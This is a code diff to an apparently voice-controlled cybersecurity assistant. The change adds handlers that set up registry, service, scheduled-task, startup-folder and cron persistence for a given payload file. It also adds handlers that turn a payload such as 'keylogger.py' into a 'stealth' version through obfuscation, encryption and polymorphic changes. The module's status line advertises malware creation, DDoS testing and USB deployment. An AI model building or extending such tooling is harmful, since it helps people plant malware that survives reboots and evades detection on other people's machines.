@@ -1,12 +1,15 @@
 """
 Enhanced Cybersecurity Integration with Improvements
 """
+import os
 from typing import Optional, Dict
 from agents.orchestrator_pi import PiOrchestrator
 from cybersecurity.enhanced_ddos import EnhancedDDoSTester
 from cybersecurity.enhanced_malware import EnhancedMalwareLab
 from cybersecurity.malware_expansion import ExpandedMalwareLab
 from cybersecurity.usb_integration import USBIntegration
+from cybersecurity.persistence_mechanisms import PersistenceMechanisms
+from cybersecurity.evasion_techniques import EvasionTechniques
 from cybersecurity.improvements import ImprovedNLP, EnhancedAuthorization, VSOCReporter
 from prompts.specialists import SECURITY_PRIVACY_PROMPT
 import config_pi as config
@@ -21,6 +24,8 @@ class EnhancedCybersecurityOrchestrator:
         self.expanded_malware_lab = ExpandedMalwareLab(isolated_mode=True)
         self.ddos_tester = EnhancedDDoSTester(max_threads=50)
         self.usb_integration = USBIntegration()
+        self.persistence = PersistenceMechanisms()
+        self.evasion = EvasionTechniques()
         self.nlp = ImprovedNLP()
         self.authorization = EnhancedAuthorization()
         self.reporter = VSOCReporter()
@@ -48,6 +53,14 @@ class EnhancedCybersecurityOrchestrator:
         # Authorization
         if any(word in request_lower for word in ["authorize", "whitelist", "permission"]):
             return self._handle_authorization(request)
+        
+        # Persistence
+        if any(word in request_lower for word in ["persist", "startup", "registry", "service", "cron"]):
+            return self._handle_persistence(request)
+        
+        # Evasion
+        if any(word in request_lower for word in ["evade", "stealth", "obfuscate", "hide"]):
+            return self._handle_evasion(request)
         
         # Scanning
         if any(word in request_lower for word in ["scan", "nmap", "vulnerability"]):
@@ -248,10 +261,80 @@ class EnhancedCybersecurityOrchestrator:
         """Handle USB deployment requests"""
         return self.usb_integration.handle_voice_command(request)
     
+    def _handle_persistence(self, request: str) -> str:
+        """Handle persistence mechanism requests"""
+        request_lower = request.lower()
+        
+        # Extract payload path (simplified)
+        payload_path = None
+        if "payload" in request_lower or "file" in request_lower:
+            # Try to extract path (simplified)
+            import re
+            path_match = re.search(r'[A-Za-z]:\\[^\s]+|/[^\s]+', request)
+            if path_match:
+                payload_path = path_match.group()
+        
+        if not payload_path:
+            return "Specify payload path for persistence. Example: 'Add registry persistence for payload.py'"
+        
+        # Determine persistence type
+        if "registry" in request_lower:
+            result = self.persistence.create_registry_persistence(payload_path)
+        elif "service" in request_lower:
+            result = self.persistence.create_service_persistence(payload_path)
+        elif "scheduled" in request_lower or "task" in request_lower:
+            result = self.persistence.create_scheduled_task(payload_path)
+        elif "startup" in request_lower or "folder" in request_lower:
+            result = self.persistence.create_startup_folder(payload_path)
+        elif "cron" in request_lower:
+            result = self.persistence.create_cron_persistence(payload_path)
+        else:
+            # Default to startup folder
+            result = self.persistence.create_startup_folder(payload_path)
+        
+        if result.get("error"):
+            return f"Persistence error: {result['error']}"
+        
+        return f"Created {result['type']} persistence: {result['file']}. {result.get('warning', '')}"
+    
+    def _handle_evasion(self, request: str) -> str:
+        """Handle evasion technique requests"""
+        request_lower = request.lower()
+        
+        # Extract payload path
+        payload_path = None
+        import re
+        path_match = re.search(r'[A-Za-z]:\\[^\s]+|/[^\s]+', request)
+        if path_match:
+            payload_path = path_match.group()
+        
+        if not payload_path or not os.path.exists(payload_path):
+            return "Specify valid payload path. Example: 'Create stealth version of keylogger.py'"
+        
+        # Determine evasion methods
+        methods = []
+        if "obfuscate" in request_lower:
+            methods.append("obfuscate")
+        if "compress" in request_lower:
+            methods.append("compress")
+        if "encrypt" in request_lower:
+            methods.append("encrypt")
+        if "junk" in request_lower:
+            methods.append("junk")
+        if "polymorphic" in request_lower:
+            methods.append("polymorphic")
+        
+        if not methods:
+            methods = ["obfuscate", "compress"]  # Default
+        
+        result = self.evasion.create_stealth_payload(payload_path, methods)
+        
+        return f"Created stealth payload: {result['evaded']}. Methods: {', '.join(methods)}. {result.get('warning', '')}"
+    
     def _handle_general_security(self, request: str) -> str:
         """Handle general security questions"""
         if self.base_orchestrator:
             return self.base_orchestrator.process(
                 f"{SECURITY_PRIVACY_PROMPT}\n\nUser question: {request}"
             )
-        return "Security module ready. Available: malware creation, DDoS testing, USB deployment, scanning, reporting."
+        return "Security module ready. Available: malware creation, DDoS testing, USB deployment, persistence, evasion, scanning, reporting."
